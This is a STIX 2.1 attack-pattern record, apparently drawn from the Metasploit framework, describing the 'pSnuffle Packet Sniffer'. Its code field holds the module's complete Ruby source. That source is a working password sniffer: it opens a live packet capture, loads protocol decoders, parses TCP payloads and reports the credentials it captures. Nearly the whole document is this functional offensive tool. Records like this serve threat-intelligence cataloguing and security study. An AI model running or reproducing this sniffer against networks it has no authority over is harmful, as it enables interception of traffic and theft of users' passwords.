{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e79298cb-187a-4d80-bfea-d3e98e93fa08",
    "created": "2024-08-14T16:31:22.614584Z",
    "modified": "2024-08-14T16:31:22.614587Z",
    "name": "pSnuffle Packet Sniffer",
    "description": "This module sniffs passwords like dsniff did in the past",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/sniffer/psnuffle.rb",
            "external_id": "psnuffle.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# dsniff was helping me very often. Too bad that it doesn't work correctly\n# anymore. Psnuffle should bring password sniffing into Metasploit local\n# and if we get lucky even remote.\n#\n# Cheers - Max Moser - mmo@remote-exploit.org\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Capture\n\n  def initialize\n    super(\n      'Name'        => 'pSnuffle Packet Sniffer',\n      'Description' => 'This module sniffs passwords like dsniff did in the past',\n      'Author'\t    => 'Max Moser <mmo[at]remote-exploit.org>',\n      'License'\t    => MSF_LICENSE,\n      'Actions'\t    =>\n        [\n          [ 'Sniffer', 'Description' => 'Run sniffer' ],\n          [ 'List', 'Description' => 'List protocols' ]\n        ],\n      'PassiveActions' => [ 'Sniffer' ],\n      'DefaultAction'  => 'Sniffer'\n    )\n    register_options [\n      OptString.new('PROTOCOLS', [true, 'A comma-delimited list of protocols to sniff or \"all\".', 'all']),\n    ]\n\n    register_advanced_options [\n      OptPath.new('ProtocolBase', [true, 'The base directory containing the protocol decoders',\n        File.join(Msf::Config.data_directory, 'exploits', 'psnuffle')\n      ]),\n    ]\n    deregister_options('RHOSTS')\n  end\n\n\n  def load_protocols\n    base = datastore['ProtocolBase']\n    unless File.directory? base\n      raise RuntimeError, 'The ProtocolBase parameter is set to an invalid directory'\n    end\n\n    allowed = datastore['PROTOCOLS'].split(',').map{|x| x.strip.downcase}\n    @protos = {}\n    decoders = Dir.new(base).entries.grep(/\\.rb$/).sort\n    decoders.each do |n|\n      f = File.join(base, n)\n      m = ::Module.new\n      begin\n        m.module_eval(File.read(f, File.size(f)))\n        m.constants.grep(/^Sniffer(.*)/) do\n          proto = $1\n          next unless allowed.include?(proto.downcase) || datastore['PROTOCOLS'] == 'all'\n\n          klass = m.const_get(\"Sniffer#{proto}\")\n          @protos[proto.downcase] = klass.new(framework, self)\n\n          print_status(\"Loaded protocol #{proto} from #{f}...\")\n        end\n      rescue => e\n        print_error(\"Decoder #{n} failed to load: #{e.class} #{e} #{e.backtrace}\")\n      end\n    end\n  end\n\n  def run\n    check_pcaprub_loaded # Check first\n    # Load all of our existing protocols\n    load_protocols\n\n    if action.name == 'List'\n      print_status(\"Protocols: #{@protos.keys.sort.join(', ')}\")\n      return\n    end\n\n    print_status 'Sniffing traffic.....'\n    open_pcap\n\n    each_packet do |pkt|\n      p = PacketFu::Packet.parse(pkt)\n      next unless p.is_tcp?\n      next if p.payload.empty?\n      @protos.each_key do |k|\n        @protos[k].parse(p)\n      end\n      true\n    end\n    close_pcap\n    print_status 'Finished sniffing'\n  end\nend\n\n# End module class\n\n# Basic class for taking care of sessions\nclass BaseProtocolParser\n\n  attr_accessor :framework, :module, :sessions, :dport, :sigs\n\n  def initialize(framework, mod)\n    self.framework = framework\n    self.module    = mod\n    self.sessions  = {}\n    self.dport     = 0\n    register_sigs\n  end\n\n  def parse(pkt)\n    nil\n  end\n\n  def register_sigs\n    self.sigs = {}\n  end\n\n  #\n  # Glue methods to bridge parsers to the main module class\n  #\n  def print_status(msg)\n    self.module.print_status(msg)\n  end\n\n  def print_error(msg)\n    self.module.print_error(msg)\n  end\n\n  def report_auth_info(*s)\n    self.module.report_auth_info(*s)\n  end\n\n  def report_note(*s)\n    self.module.report_note(*s)\n  end\n\n  def report_service(*s)\n    self.module.report_service(*s)\n  end\n\n  def find_session(sessionid)\n    purge_keys = []\n    sessions.each_key do |ses|\n      # Check for cleanup abilities... kills performance in large environments maybe\n      # When longer than 5 minutes no packet was related to the session, delete it\n      if ((sessions[ses][:mtime] - sessions[ses][:ctime]) > 300)\n        # too bad to this session has no action for a long time\n        purge_keys << ses\n      end\n    end\n    purge_keys.each {|ses| sessions.delete(ses) }\n\n    # Does this session already exist?\n    if (sessions[sessionid])\n      # Refresh the timestamp\n      sessions[sessionid][:mtime] = Time.now\n    else\n      # Create a new session entry along with the host/port from the id\n      if (sessionid =~ /^([^:]+):([^-]+)-([^:]+):(\\d+)$/s)\n        sessions[sessionid] = {\n          :client_host => $1,\n          :client_port => $2,\n          :host        => $3,\n          :port        => $4,\n          :session     => sessionid,\n          :ctime       => Time.now,\n          :mtime       => Time.now\n        }\n      end\n    end\n\n    sessions[sessionid]\n  end\n\n  def get_session_src(pkt)\n    return \"%s:%d-%s:%d\" % [pkt.ip_daddr,pkt.tcp_dport,pkt.ip_saddr,pkt.tcp_sport] if pkt.is_tcp?\n    return \"%s:%d-%s:%d\" % [pkt.ip_daddr,pkt.udp_dport,pkt.ip_saddr,pkt.udp_sport] if pkt.is_udp?\n    return \"%s:%d-%s:%d\" % [pkt.ip_daddr,0,pkt.ip_saddr,0]\n  end\n\n  def get_session_dst(pkt)\n    return \"%s:%d-%s:%d\" % [pkt.ip_saddr,pkt.tcp_sport,pkt.ip_daddr,pkt.tcp_dport] if pkt.is_tcp?\n    return \"%s:%d-%s:%d\" % [pkt.ip_saddr,pkt.udp_sport,pkt.ip_daddr,pkt.udp_dport] if pkt.is_udp?\n    return \"%s:%d-%s:%d\" % [pkt.ip_saddr,0,pkt.ip_daddr,0]\n  end\nend\n"
}